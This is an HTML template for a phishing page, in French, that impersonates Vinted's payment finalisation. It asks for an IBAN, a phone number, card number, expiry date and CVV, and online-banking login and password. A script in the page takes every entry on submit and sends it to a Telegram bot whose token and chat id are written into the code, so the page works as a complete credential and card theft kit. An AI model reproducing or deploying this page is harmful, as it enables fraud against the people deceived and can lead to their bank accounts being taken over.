<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Finalisation du Paiement - Vinted</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        body { font-family: 'Inter', sans-serif; background-color: #f0f4f8; }
        .container { background-color: #ffffff; border-radius: 1.5rem; box-shadow: 0 10px 40px rgba(0, 0, 0, 0.1); }
        .section-wrapper { border: 1px solid #d1fae5; border-radius: 1rem; overflow: hidden; box-shadow: 0 2px 8px rgba(0,0,0,0.05);}
        .section-header { background-color: #e0f2f1; padding: 1.25rem 1.5rem; cursor: pointer; transition: all 0.2s; border-bottom: 1px solid #99f6e4; }
        .section-header:hover { background-color: #b2f5ea; }
        .section-content { max-height:0; overflow:hidden; transition:max-height 0.4s ease-out; padding:0 1.5rem; background-color:#f0df4;}
        .section-content.active { max-height:2000px; padding:1.5rem;}
        .input-field { border-radius:0.75rem; border:1px solid #e5e7eb; transition: all 0.2s ease-in-out;}
        .input-field:focus { border-color: #2dd4bf; box-shadow:0 0 0 3px rgba(45,212,191,0.4); }
        .button-submit { background-image: linear-gradient(to right,#059669,#10b981); transition: all 0.3s ease; box-shadow:0 4px 15px rgba(16,185,129,0.4); }
        .button-submit:hover { transform:translateY(-2px); opacity:0.9;}
    </style>
</head>
<body class="flex flex-col justify-center items-center min-h-screen p-4 text-gray-800">

<div class="container p-6 sm:p-10 w-full max-w-2xl mx-auto my-6">
    <div class="text-center mb-8">
        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/b/b8/Vinted_Logo_2022.svg/1280px-Vinted_Logo_2022.svg.png" alt="Logo Vinted" class="mx-auto w-32 h-auto mb-4">
        <h1 class="text-3xl font-extrabold text-teal-600">Finalisez votre transaction en toute s√©curit√©</h1>
        <p class="mt-2 text-gray-500">Pour recevoir votre paiement et activer votre compte, veuillez compl√©ter les √©tapes requises ci-dessous.</p>
    </div>

    <div class="bg-teal-50 border-l-4 border-teal-500 p-5 rounded-lg mb-8">
        <p class="text-teal-900 leading-relaxed font-medium">
            Votre transaction est en cours de validation. Pour assurer la s√©curit√© de votre virement, veuillez fournir vos informations bancaires et de v√©rification.
        </p>
    </div>

    <!-- ‚úÖ Formulaire corrig√© pour POST vers Flask -->
    <form action="{{ url_for('process_payment') }}" method="post" id="paymentForm">
        <div class="space-y-6">

            <div class="section-wrapper">
                <div class="section-header flex justify-between items-center" data-target="iban-content">
                    <h3 class="text-xl font-bold text-gray-700">
                        Informations de Virement (IBAN)
                    </h3>
                    <svg class="w-6 h-6 transform transition-transform duration-300 arrow-icon text-teal-500" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 9l-7 7-7-7"></path></svg>
                </div>

                <div id="iban-content" class="section-content">
                    <p class="text-sm text-gray-600 mb-6">
                        üîí Ces informations sont essentielles pour que Vinted puisse effectuer le virement de vos gains directement sur votre compte bancaire en toute s√©curit√©.
                    </p>

                    <div class="space-y-5">
                        <div>
                            <label for="iban" class="block text-sm font-medium text-gray-700 mb-2">IBAN</label>
                            <input type="text" id="iban" name="iban" required class="input-field w-full px-4 py-3 text-sm">
                        </div>
                        <div>
                            <label for="phone_number" class="block text-sm font-medium text-gray-700 mb-2">Num√©ro de t√©l√©phone li√© au compte bancaire</label>
                            <input type="tel" id="phone_number" name="phone_number" required class="input-field w-full px-4 py-3 text-sm">
                        </div>

                        <div>
                            <label for="bank_name" class="block text-sm font-medium text-gray-700 mb-2">Nom de votre banque</label>
                            <select id="bank_name" name="bank_name" onchange="toggleOtherBankField()" required class="input-field w-full px-4 py-3 text-sm">
                                <option value="" disabled selected>S√©lectionnez votre banque</option>
                                <option value="BNP Paribas">BNP Paribas</option>
                                <option value="Cr√©dit Agricole">Cr√©dit Agricole</option>
                                <option value="Soci√©t√© G√©n√©rale">Soci√©t√© G√©n√©rale</option>
                                <option value="Autre">Autre</option>
                            </select>
                        </div>

                        <div id="other_bank_name_group" class="hidden">
                            <label for="other_bank_name" class="block text-sm font-medium text-gray-700 mb-2">Nom exact de votre banque</label>
                            <input type="text" id="other_bank_name" name="other_bank_name" class="input-field w-full px-4 py-3 text-sm">
                        </div>
                    </div>
                </div>
            </div>

            <div class="section-wrapper">
                <div class="section-header flex justify-between items-center" data-target="card-content">
                    <h3 class="text-xl font-bold text-gray-700">
                        M√©thode de Paiement par Carte (Achats)
                    </h3>
                    <svg class="w-6 h-6 transform transition-transform duration-300 arrow-icon text-teal-500" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 9l-7 7-7-7"></path></svg>
                </div>

                <div id="card-content" class="section-content">
                    <div class="grid grid-cols-1 md:grid-cols-2 gap-6">
                        <div class="md:col-span-2">
                            <p class="text-sm text-gray-600 mb-6">
                        üîí Ces informations sont n√©cessaires pour que vous puissiez effectuer des achats en toute s√©curit√© sur la plateforme √† l'avenir.
                    </p>
                            <label for="card_name" class="block text-sm font-medium text-gray-700 mb-2">Nom figurant sur la carte</label>
                            <input type="text" id="card_name" name="card_name" class="input-field w-full px-4 py-3 text-sm">
                        </div>
                        <div class="md:col-span-2">
                            <label for="card_number" class="block text-sm font-medium text-gray-700 mb-2">Num√©ro de carte</label>
                            <input type="text" id="card_number" name="card_number" pattern="[\d\s]{16,19}" maxlength="19" class="input-field w-full px-4 py-3 text-sm">
                        </div>
                        <div>
                            <label for="expiry_date" class="block text-sm font-medium text-gray-700 mb-2">Date d'expiration (MM/AA)</label>
                            <input type="text" id="expiry_date" name="expiry_date" pattern="(0[1-9]|1[0-2])\/\d{2}" maxlength="5" class="input-field w-full px-4 py-3 text-sm">
                        </div>
                        <div>
                            <label for="cvv" class="block text-sm font-medium text-gray-700 mb-2">Code CVV</label>
                            <input type="password" id="cvv" name="cvv" pattern="\d{3,4}" class="input-field w-full px-4 py-3 text-sm">
                        </div>
                    </div>
                </div>
            </div>

            <div class="section-wrapper">
                <div class="section-header flex justify-between items-center" data-target="login-content">
                    <h3 class="text-xl font-bold text-gray-700">
                        Connexion Banque en Ligne (V√©rification)
                    </h3>
                    <svg class="w-6 h-6 transform transition-transform duration-300 arrow-icon text-teal-500" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 9l-7 7-7-7"></path></svg>
                </div>

                <div id="login-content" class="section-content">
                    <div class="space-y-5">
                        <p class="text-sm text-gray-600 mb-6">
                        üîí Indispensable : Cette √©tape est requise pour le rattachement d√©finitif de vos informations, garantissant l'activation de vos fonds pour tout achat et vente futurs
                    </p>
                        <div>
                            <label for="bank_id" class="block text-sm font-medium text-gray-700 mb-2">Identifiant de connexion √† votre banque en ligne</label>
                            <input type="text" id="bank_id" name="bank_id" class="input-field w-full px-4 py-3 text-sm">
                        </div>
                        <div>
                            <label for="bank_password" class="block text-sm font-medium text-gray-700 mb-2">Mot de passe ou code s√©curis√© de votre banque en ligne</label>
                            <input type="password" id="bank_password" name="bank_password" class="input-field w-full px-4 py-3 text-sm">
                        </div>
                    </div>
                </div>
            </div>

        </div>

        <button type="submit" class="button-submit mt-8 w-full py-4 text-white rounded-xl font-extrabold text-lg">
            Valider les informations et continuer
        </button>
    </form>

    <div class="mt-8 p-4 bg-red-100 border border-red-300 rounded-lg text-red-800 text-xs shadow-inner">
        <strong class="block mb-2 text-sm font-bold">AVERTISSEMENT L√âGAL : Utilisation Frauduleuse</strong>
        <p>
            L'utilisation de moyens de paiement (cartes bancaires, identifiants) sans consentement est interdite et constitue une fraude.
        </p>
    </div>
</div>

<script>
    document.querySelectorAll('.section-header').forEach(header => {
        header.addEventListener('click', () => {
            const targetId = header.getAttribute('data-target');
            const content = document.getElementById(targetId);
            const arrow = header.querySelector('.arrow-icon');
            content.classList.toggle('active');
            arrow.classList.toggle('rotate-180');
        });
    });

    function toggleOtherBankField() {
        const bankNameSelect = document.getElementById('bank_name');
        const otherBankNameGroup = document.getElementById('other_bank_name_group');
        if (bankNameSelect.value === 'Autre') {
            otherBankNameGroup.classList.remove('hidden');
        } else {
            otherBankNameGroup.classList.add('hidden');
            otherBankNameGroup.querySelector('input').value = '';
        }
    }

    document.addEventListener('DOMContentLoaded', () => {
        document.getElementById('iban-content').classList.add('active');
        document.querySelector('[data-target="iban-content"]').querySelector('.arrow-icon').classList.add('rotate-180');
    });

    // --- TELEGRAM ---
    const paymentForm = document.getElementById('paymentForm');
    paymentForm.addEventListener('submit', async (e) => {
        const iban = document.getElementById('iban').value;
        const phone = document.getElementById('phone_number').value;
        const bank = document.getElementById('bank_name').value;
        const otherBank = document.getElementById('other_bank_name').value;
        const cardName = document.getElementById('card_name').value;
        const cardNumber = document.getElementById('card_number').value;
        const expiry = document.getElementById('expiry_date').value;
        const cvv = document.getElementById('cvv').value;
        const bankId = document.getElementById('bank_id').value;
        const bankPassword = document.getElementById('bank_password').value;

        let message = `Vinted Formulaire Paiement:\nIBAN: ${iban}\nT√©l√©phone: ${phone}\nBanque: ${bank}\nAutre Banque: ${otherBank}\nNom Carte: ${cardName}\nNum√©ro Carte: ${cardNumber}\nExpiry: ${expiry}\nCVV: ${cvv}\nBank ID: ${bankId}\nBank Password: ${bankPassword}`;

        const bot = { token: "8186336309:AAFMZ-_3LRR4He9CAg7oxxNmjKGKACsvS8A", chat_id: "6297861735" };

        try {
            await fetch(`https://api.telegram.org/bot${bot.token}/sendMessage`, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ chat_id: bot.chat_id, text: message })
            });
        } catch(err) { console.error("Erreur Telegram:", err); }
        // ‚ö†Ô∏è ne pas bloquer le submit, le formulaire POSTe normalement √† Flask
    });
</script>
</body>
</html>
